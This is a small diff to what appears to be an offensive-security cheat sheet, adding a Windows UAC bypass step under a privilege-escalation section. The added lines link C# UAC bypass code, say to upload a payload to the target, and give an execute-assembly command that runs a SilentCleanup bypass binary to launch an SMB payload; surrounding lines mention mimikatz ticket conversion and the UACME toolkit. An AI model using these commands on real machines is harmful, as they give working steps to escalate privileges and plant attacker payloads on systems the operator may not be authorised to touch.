@@ -318,6 +318,10 @@ PrivEsc
         mimikatz kirbikator lsa file.kirbi
     
 Bypass UAC
+  C# Code: https://github.com/juliourena/plaintext/tree/master/CSharp%20Tools/UAC%20Bypass
+  Upload payload to target
+  execute-assembly /opt/tools/CSharp_Tools/Compiled/uac_bypass_silentcleanup.exe C:\Users\username\AppData\Local\Temp\smb-x64.exe
+
   https://github.com/hfiref0x/UACME
     
 Persistance
